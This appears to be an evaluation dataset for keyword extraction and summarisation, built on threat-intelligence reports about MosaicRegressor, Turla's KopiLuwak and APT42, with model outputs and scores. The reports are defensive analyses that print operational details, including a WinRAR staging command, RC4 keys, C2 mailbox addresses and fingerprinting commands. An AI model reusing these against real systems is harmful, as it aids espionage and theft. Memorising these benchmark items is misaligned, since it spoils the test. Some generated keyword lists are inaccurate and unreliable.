\u201cdo move file b\u201d or \u201cdo not move file b\u201d exported function with the name \u201cLoad\u201d.Load The function is an infinite loop. Every five minutes it checks if there is a file named %APPDATA%\\Microsoft\\Windows\\LnkClass.dat. If the file is present, it then executes24\u201c%APPDATA%\\Microsoft\\Windows\\LnkClass.dat\u201d a -hpHFG5fv(*&# -r \u201c%APPDATA%\\Microsoft\\Credentials\\MSI36C2.dat\u201d %CSIDL_RECENT%Here, %CSIDL_RECENT% is the location of the \u201cRecent documents\u201d folder. Although the original file named LnkClass.dat was not recovered, the command line is valid for a popular archiver called WinRAR - it is a command to store the contents \u201cCryptoSysPrep\u201d.CryptoSysPrep The function checks for the presence of additional DLL files and loads them in separate threads:%APPDATA%\\Microsoft\\Windows\\SendTo\\cryptui.sep, called by function RetrievePKCS7FromCA%APPDATA%\\Microsoft\\Network\\sppsvc.sep, copied to %APPDATA%\\Microsoft\\sppsvc.tbl, then loaded and called by function \u201cPlugA\u201d%APPDATA%\\Microsoft\\Network\\subst.sep, copied to %APPDATA%\\Microsoft\\subst.tbl, then loaded and called by All strings related to the business logic are encrypted with a homebrew algorithm similar to RC4 with a hardcoded extended S-Box of 1024 bytes.The module checks if there is a file present at %COMMON_APPDATA%\\Microsoft\\Windows\\user.rem. If it is present, the file is copied to %APPDATA\\Microsoft\\dfsadu.dll; then it is loaded and its export \u201cMediaA\u201d is called in a new thread.Then the function enters an infinite loop. Every 20 minutes it tries to connect to a POP3S server \u201cpop.mail.ru\u201d. The module uses the first of two pairs of hardcoded credentials that worked.Login (password hardcoded but not shown)Feedback e-mail addressthtgoolnc@mail.ruthbububugyhb85@mail.ruthgetmmun@mail.ruthyhujubnmtt67@mail.ruThe module attempts to download the first e-mail message from the mailbox into the %TEMP% directory using a temporary filename with the prefix \u201cHt\u201d. If the download succeeds, it deletes the message via IMAPS using the same credentials.It parses the MIME format using a code that appears to be similar to a widespread open-source class CMimeMessage (the class name is included in the RTTI information too). It extracts the message\u2019s subject and continues if it is equal to \u201cRepeatA\u201d, \u201cRepeatB\u201d, \u201cRepeatC\u201d, \u201cRepeatD\u201d. If the subject matches one of the names, the attachment from that message is saved and decrypted and then copied with a DLL extension:SubjectRepeatARepeatBRepeatCRepeatD26Temporary DLL name%TEMP%\\RepairA.dll%TEMP%\\RepairB.dll%TEMP%\\RepairC.dll%TEMP%\\RepairD.dllThe DLL file is then loaded and called by export \u201cMediaA\u201d. Depending on the return value of that function, the DLL file may be deleted or left on disk. Also, the module may encrypt a temporary file produced by the function, and send it as an attachment of type \u201capplication/x-msdownload\u201d with the name \u201cattach.dat\u201d, to the \u201cfeedback\u201d email address via SMTPS. The subject of the message is set to \u201cMINE UPLOAD\u201d and the \u201cFrom\u201d field is set to the login used to retrieve the incoming messages.OLE2 Equation dropperMD5: 33F21AC73AFF4DFF71316795282A3D06 (OLE2 part)This is a recovered part of a weaponized document. Since most related code and documents described in public reports are known to be RTF documents, this one could also have been embedded in an RTF document.The OLE2 stream creation date for all the streams is 2019-02-02. It contains composite objects of types \u201cMicrosoft Equation 3.0\u201d and \u201cMicrosoft OLE 1.0 Native\u201d. The Equation object uses a well-known exploit CVE-2018-0802 and the OLE 1.0 holds the EXE file that is decrypted by the shellcode of the exploit.Several notable findings:The OLE 1.0 Native CompObj stream contains the name in Russian \u201c\u041f\u0430\u043a\u0435\u0442\u201d along with the English name \u201cPackage\u201d. It also has starts the executable from its DllMain function and returns.Winhttp-based downloaders, extendedThese samples seem to be based on the same code for collecting system information as the downloaders using BITS and Curl and use the same text messages with non-ASCII symbols. However the code in these files uses WinHTTP API for value Media=%location of the executable%.The program collects system information in a text file %APPDATA%%Computername%. The data is similar to the one collected by other \u201cextended downloaders\u201d, but also includes the list of running processes (all samples except mounted disks and the listings of their root directories. The text file is uploaded to the C&C server with a POST request to %C&C server%/upload.php.The module downloads two executable files. The first file is saved in the %STARTUP% folder and the second one is saved in the folder named %APPDATA%\\Microsoft and started immediately. The URLs and names of the files vary. The code also contains references to the file \u201crepeat\u201d but that file is never downloaded. Existing files, if they are present and are different in size, are moved into a temporary file with the prefix %TEMP%\\341 and then deleted.Each file is downloaded from the URL constructed according to the format: %C&C server%/%Computername%/%filename%, Agent string or \u201cMozilla/4.0\u201d.C&C addresses and file namesMD5C&C serverRemote reports a unique hardcoded \u201cID\u201d similar to the \u201cEXE ID\u201d string used in other types of downloaders. the sample ", "generated_text": "MosaicRegressor; a multi-stage; modular framework; espionage; data gathering; UEFI firmware; persistence; the framework; downloaders; intermediate loaders; payloads; C2; a Hacking Team bootkit; VectorEDK; the victim machine; persistence; the initial stage; the bootkit; the system; control; the bootloader; SmmInterfaceBase; a callback; a persistent dropper; user-mode malware; SmmAccessSub; a persistent dropper; SmmReset; a driver; NTFS; a source code; the developers; the open source code; the tools; these components.", "ref_text": "<START-1>The document provides technical details on a malware framework named MosaicRegressor that is used for espionage and data gathering. MosaicRegressor has been seen installed in victim UEFI firmware for persistence. It uses a leaked HackingTeam bootkit called VectorEDK. It has multiple stages and components. Initial downloaders written in C++ fetch additional modules from command and control servers. The downloaders use BITS jobs, libcurl, WinHTTP API, or check webmail for modules. Email attachments are decrypted DLLs or executables. Downloaded modules collect system info and send it to command servers. Later stages exfiltrate documents and data. Components have varying levels of obfuscation. Strings are Base64 or XOR encoded. Payloads use simple exported functions. There are language artifacts suggesting some developers are of Chinese or Korean origin. Code similarities exist to Gaza Hacker Team. Targets are primarily in the Middle East. Both opportunistic attacks and tailored phishing emails have been observed. Low sophistication but modular design makes MosaicRegressor extensible. Persistence in firmware raises the stakes of infections. While not advanced, the framework's continuing evolution, targeting, and shadowy control indicate an experienced threat actor. <END-1>", "t5/keyword/hint_hit_precision": 0.2857142857142857, "t5/word/hint_hit_recall": 0.07222222222222222, "gpt3/lexical/rouge_rouge1": 0.4347826086956522, "gpt3/lexical/rouge_rouge2": 0.08754208754208753, "gpt3/lexical/rouge_rougeL": 0.2140468227424749, "gpt3/lexical/rouge_rougeLsum": 0.2140468227424749, "gpt3_generated_text": ["MosaicRegressor is a sophisticated and modular framework designed for espionage and data gathering. It includes downloaders and intermediate loaders to fetch and execute payloads on victim machines. In some instances, the initial stage of the framework has been embedded in the victim's UEFI firmware, allowing for persistent access beyond the operating system level. The compromised UEFI firmware revealed components closely related to a leaked Hacking Team bootkit called VectorEDK. These components, such as SmmInterfaceBase and SmmAccessSub, work together to deploy the bootkit, mark its execution, and drop user-mode malware onto the system. The framework demonstrates a high level of control and persistence, showcasing the capabilities of the developers in leveraging open-source tools for malicious purposes."]}, {"split_name": "val", "sample_id": "val_25", "prompt_text": "Extract the keywords: Turla APT actor refreshes KopiLuwak JavaScript backdoor for use in G20-themed attackAUGUST 17, 2017 Darien HussOverviewProofpoint researchers have observed a well-known Russian-speaking APT actor usually referred to as Turla using a new .NET/MSIL dropper for an existing backdoor called JS/KopiLuwak. The backdoor has been analyzed previously [11] and is a robust tool associated with this group, likely being used as an early stage reconnaissance tool.In this case, the dropper is being delivered with a benign and possibly stolen decoy document inviting recipients to a G20 task force meeting on the \"Digital Economy\". The Digital Economy event is actually scheduled for October of this year in Hamburg, Germany. The dropper \ufb01rst appeared in mid-July, suggesting that this APT activity is potentially ongoing, with Turla actively targeting G20 participants and/or those with interest in the G20, including member nations, journalists, and policymakers. This blog provides details on the dropper and known information on the infection chain and current related Turla activity. Actor OverviewTurla is a well-documented, long operating APT group that is widely believed to be a Russian state-sponsored organization. Turla is perhaps most notoriously suspected as responsible for the breach of the United States Central Command in 2008 [1]. More recently Turla was accused ofbreaching RUAG, a Swiss technology company, in a public report published by GovCERT.ch [2]. Various other Turla frameworks, implants, and campaigns have been detailed extensively by our fellow security organizations and companies [3-10]. DeliveryThe delivery of KopiLuwak in this instance is currently unknown as the MSIL dropper has only been observed by Proofpoint researchers on a public malware repository. Assuming this variant of KopiLuwak has been observed in the wild, there are a number of ways it may have been delivered including some of Turla\u2019s previous attack methods such as spear phishing or via a watering hole. Based on the theme of the decoy PDF, it is very possible that the intended targets are individuals or organizations that are on or have an interest in G20\u2019s Digital Economy Task Force. This could include diplomats, experts in the areas of interest related to the Digital Economy Task Force, or possibly even journalists. AnalysisThe earliest step in any possible attack(s) involving this variant of KopiLuwak of which Proofpoint researchers are currently aware begin with the MSIL dropper. The basic chain of events upon execution of the MSIL dropper include dropping and executing both a PDF decoy and a Javascript (JS) dropper. As explained in further detail below, the JS dropper ultimately installs a JS decryptor onto an infected machine that will then \ufb01nally decrypt and execute the actual KopiLuwak backdoor in memory only (Fig. 1).Figure 1: Diagram showing execution beginning with the MSIL dropperAs Proofpoint has not yet observed this attack in the wild it is likely that there is an additional component that leads to the execution of the MSIL payload. This may include a maliciousdocument, compressed package attached to an e-mail, or perhaps it could be delivered via a watering hole attack.The KopiLuwak MSIL dropper is straightforward and contains absolutely no obfuscation or anti- analysis. Internally the MSIL dropper is called Runer.exe and also contains a PDB string: \u201cc:\\LocalDisc_D\\MyProjects\\Runer\\Runer\\obj\\Release\\Runer.pdb\u201d. The Stage1 JS and PDF decoy are both stored in plaintext in the dropper and are simply written to %APPDATA% then executed (Fig. 2).Figure 2: MSIL dropper writing both the Stage1 JS and decoy PDF then executing bothBoth of the dropped \ufb01les have hardcoded names: the JS is named Scr.js while the PDF is named Save the Date G20 Digital Economy Taskforce 23 24 October.pdf. The decoy in this case is an invitation to save the date for a meeting of the G20\u2019s Digital Economy Taskforce (Fig. 3) in Hamburg, Germany.Figure 3: PDF decoy with a \u201cSave the Date\u201d invitation for a G20 Digital Economy Taskforce meetingAs far as we are aware, this document is not publicly available and so may indicate that an entity with access to the invitation was already compromised. Alternatively, the document may have been legitimately obtained from a recipient.Proofpoint researchers ascertain with medium con\ufb01dence that the document is legitimate and not fabricated. One piece of evidence suggesting that the document could be authentic is that in the document\u2019s exif metadata, the creator tool is listed as \u201cBE.D4.113.1\u201d (Fig. 4) which matches another PDF document that appears to have been scanned and is hosted on the Bundesministerium f\u00fcr Wirtschaft und Energie website (Fig. 5).Figure 4: Exif metadata from the decoy PDFFigure 5: Exif metadata from the PDF hosted on bmwi[.]deBMWi, which translates to Federal Ministry for Economic Affairs and Energy, is the organization from which the decoy document supposedly originated. Both documents were also supposedly created on a KONICA MINOLTA bizhub C284e according to their exif metadata.Scr.js AnalysisScr.js is essentially a dropper for the actual backdoor in addition to running all the necessary commands to \ufb01ngerprint the infected system and set up persistence. Scr.js \ufb01rst creates a scheduled task named PolicyConverter for persistence. This scheduled task should execute shortly after being created and is then scheduled to run every 10 minutes. The scheduled task is executed with the following parameters: \u201cappidpolicyconverter.js FileTypeXML gwVAj83JsiqTz5fG\u201d. Similar to the older KopiLuwak variant, the second parameter is used as an RC4 key to decrypt the encrypted JS backdoor code contained in appidpolicyconverter.js.Next, Scr.js decodes a large base64 blob containing the JS backdoor decryptor and saves it to the following location: \u201cC:\\Users\\[executing user]\\AppData\\Roaming\\Microsoft\\Protect\\appidpolicyconverter.js\u201dLastly, Scr.js executes various commands to \ufb01ngerprint details about the infected system. In the older variant of KopiLuwak, these commands were executed directly from the backdoor JS. Now, however, they have been moved to the dropper. Despite moving the machine \ufb01ngerprinting code to the dropper, all of the commands are the same as in the older sample (and executed in the same order) except for the following three additions:\u2022 \u2022 \u2022dir \u201c%program\ufb01les%\\Kaspersky Lab\u201d dir \u201c%program\ufb01les(x86)%\\Kaspersky Lab\u201d tracert www.google.comInterestingly the only anti-virus company that is speci\ufb01cally \ufb01ngerprinted is Kaspersky, which was possibly added as a result of their public analysis of this backdoor. The output from the commands are saved to the following location: \u201c%appdata%\\Microsoft\\Protect\\~~.tmp\u201dappidpolicyconverter.js AnalysisThe appidpolicyconverter.js script contains a large string that is \ufb01rst base64-decoded then RC4- decrypted using the supplied parameter as a key (\u201cgwVAj83JsiqTz5fG\u201d) from the executed task. Once the KopiLuwak backdoor code is successfully decrypted, it is then executed with eval().The decrypted code functions similarly to the original KopiLuwak discussed by Kaspersky with some slight changes. The backdoor still communicates with what appear to be two compromised, legitimate websites using HTTP POST requests (Fig. 6).Figure 6: Hardcoded legitimate, compromised command and control serversDiffering from the older sample, the HTTP User-Agent is now hardcoded and no longer contains a component unique to each infected machine.Each HTTP POST request sent to the command and control (C&C) will contain information in its client body. The plaintext content is \ufb01rst preceded with a hardcoded key \u201cPrc1MHxF_VB0ht7S\u201d. Next, the key is followed by a separator string \u201cridid\u201d. Next, the hardcoded key \u201cPrc1MHxF_VB0ht7S\u201d is used to encode the infected system\u2019s OS installation date (Fig. 7).Figure 7: Retrieving the OS installation dateIf any additional information is being sent to the C&C it will then be appended after the encoded installation date. Finally, the data is encrypted with RC4 using a hardcoded key: responses from the C&C are decrypted, they are compared to a list of supported commands. This newer variant of KopiLuwak has several different supported command keywords, including one additional command, giving a total of \ufb01ve commands versus the old variant\u2019s four (Table 1).Command Send the content infected system\u2019s \ufb01ngerprint info stored in ~~.tmp and exit Ex\ufb01ltrate content from provided \ufb01lename (from C2) to C2. Max ex\ufb01ltrated \ufb01le size is <= 1048576 bytes (1MB) Two options for this command: -execute provided JS using eval, send contents of ~~.tmp to C2, delete ~~.tmp -save provided content to a \ufb01le in %Appdata%\\Microsoft\\Protect\\a3q4d.[ext], execute the \ufb01le, sleep for a random amount of time, delete the \ufb01le, send the contents of ~~.tmp to C2, and delete ~~.tmp Exit the script. The scheduled task would execute the backdoor again in ~10 minutes Saves the provided content with provided extension to %Appdata%\\Microsoft\\Protect\\D8chd.[ext]. If successful sends success message to C2.Table 1: KopiLuwak supported commands and descriptionsThe newer variant of KopiLuwak is now capable of ex\ufb01ltrating \ufb01les to the C&C as well as downloading \ufb01les and saving them to the infected machine. Although these capabilities could have been accomplished in the previous variant by executing arbitrary commands, they are now implemented with their own dedicated commands. Despite the added capabilities, we still agree with Kaspersky that this backdoor is likely used as an initial reconnaissance tool and would probably be used as a staging point to deploy one of Turla\u2019s more fully featured implants. We also believe this backdoor will continue to be used in the future as suggested by the continued development of the backdoor itself as well as the new delivery mechanisms. ConclusionBecause the samples were obtained from a public malware repository and we have not yet observed them in the wild, the full scope and impact of the attack (or, possibly, a pending attack) cannot be fully assessed. However, for PCs running the .NET framework (which includes most modern Windows operating systems), the potential impact is high:\u2022\u2022The JavaScript dropper pro\ufb01les the victim\u2019s system, establishes persistence, and installs the KopiLuwak backdoor. KopiLuwak is a robust tool capable of ex\ufb01ltrating data, downloading additional payloads, and executing arbitrary commands provided by the actor(s)The high pro\ufb01le of potentially targeted individuals associated with the G20 and early reconnaissance nature of the tools involved bear further watching. We have noti\ufb01ed CERT-Bund of this activity.We will continue to track the activities associated both with this actor and these new tools and update this blog as details emerge. References[1] url url url url url\ufb01reeye.com/rs/848-DID-242/images/rpt-witchcoven.pdf[6] url bug-attack-group.pdf[7] url backdoor/[8] url\ufb01refox- extension-abusing-instagram/[9] url identi\ufb01ed[10] url url of Compromise (IOCs) php52/lib/xrstf/Composer52/LogsLoader.phpET and ETPRO Suricata/Snort Coverage2827574,ETPRO TROJAN Turla JS/KopiLuwak CnC Beacon M12827575,ETPRO TROJAN Turla JS/KopiLuwak CnC Beacon M2Most recent2 WEEKS AGO Smominru Monero mining botnet making millions for operators\ue9083 WEEKS AGO Double dipping: Diverting ransomware Bitcoin payments via .onion domains1 MONTH AGO Proofpoint Q4 2017 Threat Report: Coin miners and ransomware are front and center1 MONTH AGO Holiday lull? Not so much2 MONTHS AGO North Korea Bitten by Bitcoin Bug: Financially motivated campaigns reveal new dimension of the Lazarus GroupRelated Links Ransomware Survival Guide \uf105 Threat Insight Blog \uf105 Events \uf105 Media Contacts \uf105Company InformationAbout Proofpoint Board of Directors News Center\uf105\uf105\uf105\uf105\uf105\uf105\uf105Quick linksDaily Ruleset Summary\uf105IP Address Blocked? Threat Insight (blog) Upgrade from McAfee\uf105\uf105\uf105Connect\ue910See all contactsRegionsUnited StatesUnited Kingdom FranceGermanySpainJapanAustralia\u00a9 2018 . All rights reserved.Privacy Policy. ", "generated_text": "the PDF; G20; October; this year; November; Turla; a new.NET/MSIL dropper; JS/KopiLuwak; the backdoor; memory; the malware; a decoy document; the victim; the JavaScript decoy; a decoy PDF; a malicious document; the MSIL dropper; Runer.exe; a PDB string; a C2 server; the JS decryptor; memory; a malicious document; the C2 server; the JS decryptor; the MSIL payload; the C2 server; the C2 server; this attack; the group; targets; individuals; journalists; policymakers; this attack; the group; RUAG; a Swiss technology company; this attack; a new.NET/MSIL dropper.", "ref_text": "<START-1>The document analyzes a new variant of the Turla APT group's KopiLuwak JavaScript backdoor being spread via a .NET dropper. The dropper was found on a malware repository and delivered the backdoor along with a G20-themed decoy document. This suggests targets may be involved in the G20 Digital Economy Task Force. The MSIL dropper drops and executes the Stage1 JS dropper and a PDF decoy. The JS dropper sets persistence, fingerprints the system, and installs the JS backdoor decryptor. The backdoor uses RC4 encryption and communicates with two compromised websites. It can exfiltrate data, download files, and execute arbitrary commands from the attacker. Changes from older versions include additional system fingerprinting, hardcoded network communication values, and a new command for downloading files. While the full scope of attacks leveraging this variant is unknown, its continual evolution highlights Turla's capabilities and efforts to refine their tools against high-value diplomatic and government targets. <END-1>", "t5/keyword/hint_hit_precision": 0.125, "t5/word/hint_hit_recall": 0.052980132450331126, "gpt3/lexical/rouge_rouge1": 0.47887323943661975, "gpt3/lexical/rouge_rouge2": 0.14184397163120568, "gpt3/lexical/rouge_rougeL": 0.2535211267605634, "gpt3/lexical/rouge_rougeLsum": 0.2535211267605634, "gpt3_generated_text": ["The Turla APT actor has been observed using a new.NET/MSIL dropper to deliver the JS/KopiLuwak backdoor in a G20-themed attack. The backdoor is being distributed with a decoy PDF inviting recipients to a Digital Economy Taskforce meeting in Hamburg, Germany in October of this year. The dropper, named Runer.exe, drops and executes both a PDF decoy and a JavaScript dropper, ultimately installing a JS decryptor that executes the KopiLuwak backdoor in memory. The MSIL dropper contains no obfuscation and the decoy PDF is not publicly available, indicating that the attacker may have compromised an entity with access to the invitation. This ongoing APT activity targets G20 participants, journalists, and policymakers, with the Turla group being widely believed to be a Russian state-sponsored organization."]}, {"split_name": "val", "sample_id": "val_26", "prompt_text": "Extract the keywords: T H R E A T I N T E L L I G E N C E R E P O R TAPT42: Crooked Charms, Cons and CompromisesAPT42Executive Summary2Mandiant assesses with high confidence that APT42 is an Iranian state-sponsored cyber espionage group tasked with conducting information collection and surveillance operations against individuals and organizations of strategic interest to the Iranian government. We further estimate with moderate confidence that APT42 operates on behalf of the Islamic Revolutionary Guard Corps (IRGC) Intelligence Organization (IRGC-IO) based on targeting patterns that align with the organization's operational mandates and priorities.Active since at least 2015, APT42 is characterized by highly targeted spear phishing and surveillance operations against individuals and organizations of strategic interest to Iran. The group\u2019s operations, which are designed to build trust and rapport with their victims, have included accessing the personal and corporate email accounts of government officials, former Iranian policymakers or political figures, members of the Iranian diaspora and opposition groups, journalists, and academics who are involved in research on Iran. After gaining access, the group has deployed mobile malware capable of tracking victim locations, recording phone conversations, accessing videos and images, and extracting entire SMS inboxes.APT42 has a demonstrated ability to alter its operational focus as Iran\u2019s priorities evolve over time. We anticipate APT42 will continue to conduct cyber espionage operations in support of Iran\u2019s strategic priorities in the long term based on their extensive operational history and imperviousness to public reporting and infrastructure takedowns.OverviewMandiant assesses with high confidence that APT42 is a prolific and well-resourced threat actor that carries out Iranian state- sponsored espionage and surveillance activity in support of Iran\u2019s strategic priorities. The group has been active since at least early 2015 and relies primarily on highly targeted social engineering efforts to achieve its objectives against both individuals and organizations of interest to the Iranian government. APT42 operations broadly fall into three categories:\u2022 Credential harvesting: APT42 frequently targets corporate and personal email accounts through highly targeted spear- phishing campaigns with enhanced emphasis on building trust and rapport with the target before attempting to steal their credentials. Mandiant also has indications that the group uses credential harvesting to collect Multi-Factor Authentication (MFA) codes to bypass authentication methods and has used compromised credentials to pursue access to the networks, devices and accounts of employers, colleagues and relatives.3\u2022 Surveillance operations: As of at least late 2015, a subsetof APT42\u2019s infrastructure served as command-and-control (C2) servers for Android mobile malware designed to track locations, monitor communications and generally surveil the activities of individuals of interest to the Iranian government, including activists and dissidents inside Iran.\u2022 Malware deployment: While APT42 primarily prefers credentialharvesting over activity on disk, several custom backdoors and lightweight tools complement its arsenal. The group likely incorporates these tools into their operations when the objectives extend beyond credential harvesting.Mandiant has observed over 30 confirmed APT42 targeted operations spanning these categories since early 2015. The total number of APT42 intrusion operations is almost certainly much higher based on the group\u2019s high operational tempo, visibility gaps caused in part by the group\u2019s targeting of personal email accounts and domestically focused efforts and extensive open-source industry reporting on threat clusters likely associated with APT42.APT42 had been previously tracked by Mandiant as UNC788.APT42Credential HarvestingSurveillance OperationsMalware DevelopmentFIGURE 1. APT42 operations by category.4APT42 has targeted the following sectors:\u2022 Civil society and nonprofits\u2022 Education\u2022 Governments\u2022 Healthcare\u2022 Legal and professional services\u2022 Manufacturing\u2022 Media and entertainment\u2022 PharmaceuticalsAPT42 has targeted organizations in at least 14 countries since our first observation of its activity in 2015, including in Australia, Europe, the Middle East and the United States.TargetingThe targeting patterns for APT42 operations are similar to other Iranian cyber espionage actors, with a large segment of activity focused on the Middle East region. However, unlike other suspected IRGC-affiliated cyber espionage groups that have focused on targeting the defense industrial base or conducting large-scale collection of personally identifiable information (PII), APT42 primarily targets organizations and individuals deemed opponents or enemies of the regime, specifically gaining access to their personal accounts and mobile devices. The group has consistently targeted Western think tanks, researchers, journalists, current Western government officials, former Iranian government officials and the Iranian diaspora abroad.Some APT42 activity indicates the group alters its operational focus as Iran\u2019s priorities evolve. This includes targeted operations against the pharmaceutical sector at the onset of the COVID-19 pandemic in March 2020 and the pursuit of domestic and foreign-based opposition groups prior to an Iranian presidential election. This indicates that APT42 is trusted by the Iranian government to quickly react to geopolitical changes by adjusting their flexible operations to targets of operational interest to Tehran. APT 42 TargetingTargeted IndustriesCivil society and non-profitsEducationGovernmentsHealthcareLegal and professional servicesManufacturingMedia and entertainmentPharmaceuticalsFIGURE 2. Countries and industries targeted directly by APT42.5Personal Email Targeting APT42 has consistently targeted the personal email accounts and MFA codes of individuals of interest to the Iranian government.\u2022 In May 2017, APT42 targeted the senior leadership of an Iranianopposition group operating from Europe and North America with spear-phishing emails mimicking legitimate Google correspondence. The emails contained links to fake Google Books pages which redirected to sign-in pages designed to steal credentials and two-factor authentication codes.Cyber Espionage OperationsAPT42 operations are consistent with Iran\u2019s strategic priorities and reflect an operational mandate to collect information on individuals and organizations of interest to the Iranian government or deemed to pose a threat to the regime. The group\u2019s activity focuses on social engineering and exhibits patience and resource-intensive efforts to craft targeted decoy content and build rapport with targets before providing a credential harvesting link or malicious attachment.Credential Harvesting Activity APT42 has consistently targeted Western think tanks and academics, media organizations, members of the Iranian diaspora in the United Kingdom, Israel, the United States and high-profile Iranian individuals within Iran in efforts to collect credentials of individuals of interest to the Iranian government. Some credential harvesting efforts have also included components designed to steal MFA codes.FIGURE 3. APT42 fake Google Books page.\u2022 In April 2018, APT42 targeted the Google Gmail account of an Iranian environmental activist with a fake login page. The individual hadpreviously been arrested by the Iranian government which cracked down on environmental activism in early 2018.6FIGURE 4. Gmail login page personalized for a redacted victim (left), spoofed two-factor authentication (right).\u2022 In October 2019, APT42 attempted to steal the personal Gmail credentials of an Iranian lecturer and newspaper editor in Israel.\u2022 In February 2021, APT42 targeted the personal email credentials of a senior Israeli government official with a credential harvestingpage mimicking the Gmail login page.FIGURE 5. Pre-filled login form for credential harvesting.\u2022 In June 2020, APT42 sent a spear-phishing email to an employee of a U.S.-based non-profit organization who had previously publishedon the condition of Iran\u2019s civil society.7\u2013 After sending an email from the compromised inbox, APT42attempted to cover their tracks by deleting the message from the victim\u2019s Sent folder.\u2013 APT42 also attempted to access the personal email accountsof their targets, taking careful steps to avoid detection.\u2013 APT42 was able to bypass multi-factor authentication bycapturing SMS-based one-time passwords and successfully setting up two-factor verification using the Microsoft Authenticator application.\u2013 Once inside one victim organization, APT42 accessed filesrelating to Iran through their M365 environment.\u2013 The group authenticated to the compromised accountsusing an Outlook client, suggesting existing mail items may have been synchronized with the attacker's host.Impersonation and Building Trust APT42 often attempts to build rapport with their target by impersonating journalists or researchers and engaging the target in benign conversation for multiple days or weeks before sending a malicious link. In some cases, the group uses compromised email accounts in follow-on operations targeting colleagues, acquaintances or relatives of the initial victim.\u2022 APT42 used a compromised email account belonging to a U.S.- based think tank employee to target Middle East researchers at other think tanks and academic organizations, U.S. government officials involved in Middle East and Iran policy, a former Iranian government official, and high-ranking members of an Iranian opposition group between March and June 2021.\u2013 The actor posed as a well-known journalist from a U.S. media organization requesting an interview and engaged the initial target for 37 days to gain their trust before finally directing them to a credential harvesting page. In other instances, APT42 provided a Dropbox link to a PDF with an embedded URL shortening link that led to a credential harvesting page (shown in Figure 6).FIGURE 6. PDF document with embedded link to credential harvesting page.\u2022 APT42 impersonated a legitimate British news organization to obtain the personal email credentials of political science professorswith ties to local governments or with relatives holding dual citizenship with Iran in February 2022. The group invited its targets, located in Belgium and the United Arab Emirates, to an online interview via a customized PDF document containing an embedded link leading to a Gmail credential harvesting page.8FIGURE 7. PDF with interview invitation.\u2022 In the weeks ahead of Iran\u2019s June 18, 2021, presidentialelection, APT42 used a compromised email address belonging to an Iran researcher at a U.S. think tank to spear phish a member of an Iranian opposition group headquartered in Europe in a probable attempt to gain access to the organization and its other members. The group impersonated the researcher and invited the target to review and provide feedback on one of the researcher\u2019s articles on Iranian nuclear issues in a likely effort to build trust with the target before engaging in further conversation.\u2022 Between March and June 2020, APT42 targeted high-profile individuals in the U.S. pharmaceutical industry in what may have been a temporary shift to support Iranian public health priorities amid the COVID-19 pandemic. APT42 attempted to steal personal email credentials with credential harvesting forms masquerading as popular email services such as Gmail and Yahoo and impersonated a legitimate vaccinologist at the University of Oxford, claiming to have identified an information leakage from the targeted organization.9FIGURE 8. APT42 impersonates University of Oxford vaccinologist.FIGURE 9. APT42 Credential harvesting page masquerading as a Yahoo login portal.Surveillance Operations Mandiant assesses with high confidence that APT42 conducts surveillance and monitoring operations against individuals of interest to the Iranian government. In addition to credential harvesting activity, the group uses mobile malware to target individuals of interest, including those with connections to the Green Movement in Iran and other political targets. Mandiant observed APT42 target individuals who claimed to be able to provide tools to bypass government restrictions such as those imposed on Telegram.\u2022 APT42 likely delivers its Android malware such as VINETHORNand PINEFLOWER via text messages.1 0\u2022 Between July 2020 and March 2021, the group successfully used PINEFLOWER Android malware to compromise several dozen Android devices we believe belong to individuals residing in Iran.\u2013 APT42 exfiltrated recorded phone calls, room audiorecordings, images and entire SMS inboxes from at least 10 compromised devices, often daily.\u2013 APT42 used earlier versions of PINEFLOWER as early as 2015.\u2022 APT42 infrastructure served as command and control for a VINETHORN payload masquerading as a legitimate VPN application between April and October 2021.\u2022 Mandiant most recently observed APT42 PINEFLOWER activitytargeting Iran-based individuals with ties to universities, reformist political groups, and human rights activists between June and August 2022.FIGURE 10. VINETHORN malicious Android application.\u2022 In early July 2021, APT42 hosted malicious webpages masquerading as an adult content website and a free audio/video calling and instantmessenger software. The landing pages profiled visitors to the page, requested the user to turn on location services, and sent the data back to a hard-coded Telegram chat. In one instance, the page supported formatting for mobile devices and displayed requests to the user in Arabic, suggesting Arabic speakers may have been targeted. Iran saw significant protests in July 2021, including in the Khuzestan region, which is home to Iran\u2019s Arab minority.1 1Malware Operations While APT42 focuses on credential harvesting rather than deploying malware on a system, several custom backdoors and lightweight tools complement its arsenal. Since 2020, APT42 has primarily relied on lightweight toehold backdoors over fully functional modular tools. Mandiant assesses that APT42 has limited in-house malware development resources because recent malware families such as TABBYCAT and VBREVSHELL have included or largely consisted of publicly available code copied from GitHub projects.\u2022 In September 2021, APT42 used a compromised Europeangovernment email account to send a phishing email to almost 150 email addresses associated with individuals or entities employed by or affiliated with civil society, government or intergovernmental organizations around the world. The email used lure content pertaining the organizational chart of an embassy in Tehran and contained a Google Drive link to a malicious macro document leading to TAMECAT, a PowerShell toehold backdoor.\u2022 In January and February 2022, APT42 hosted severalmalicious Office documents on an Amazon Web Service instance, Google Drive and Dropbox. Likely delivered via a link sent in a spear-phishing email, the malicious documents used geopolitically themed decoy content and fetched a password-protected remote template document via Microsoft OneDrive links. These documents led to TABBYCAT and VBREVSHELL malware, which are a VBA-based dropper and reverse shell macro, respectively.\u2022 APT42 infrastructure hosted malicious PowerShell codein the banners of odd ports in early March 2022. The code, when run, retrieved additional PowerShell payloads including POWERPOST, a custom reconnaissance tool that can collect data on a local host, including system information and local account names.FIGURE 11. APT42 domain masquerades as legitimate messaging platform.The use of Android malware to target individuals of interest to the Iranian government provides APT42 with a productive method of obtaining sensitive information on targets, including movement, contacts and personal information. The group\u2019s proven ability to record phone calls, activate the microphone and record the audio, exfiltrate images and take pictures on command, read SMS messages and track the victim's GPS location in real time poses a real-world risk to individual victims of this campaign.FIGURE 12. Banner response (left) versus de-obfuscated PowerShell code (right).1 2Potential Ties Between APT42 and Ransomware ActivityMandiant further highlights open-source reporting from Microsoft claiming a connection between intrusion activity clusters that generally align with APT42 and UNC2448, an Iran-nexus threat actor known for widespread scanning for various vulnerabilities, the use of the Fast Reverse Proxy tool, and reported ransomware activity using BitLocker. Notably, Mandiant has not observed technical overlaps between APT42 and UNC2448.\u2022 In November 2021, Microsoft reported that \u201cPhosphorus\u201dhad targeted Fortinet FortiOS SSL VPN and unpatched on-premises Exchange servers globally with the intent of deploying ransomware such as BitLocker on vulnerable networks, aligning with activity we track as UNC2448. Previous reporting on Phosphorus generally aligned with APT42\u2019s credential harvesting and spear-phishing operations.While Mandiant has not observed technical overlaps between APT42 and UNC2448, the latter may also have ties to the IRGC-IO. We assess with moderate confidence that UNC2448 and the Revengers Telegram persona are operated by at least two Iranian front companies, Najee Technology and Afkar System, based on open-source information and operational security lapses by the threat actors. Public leaking campaigns 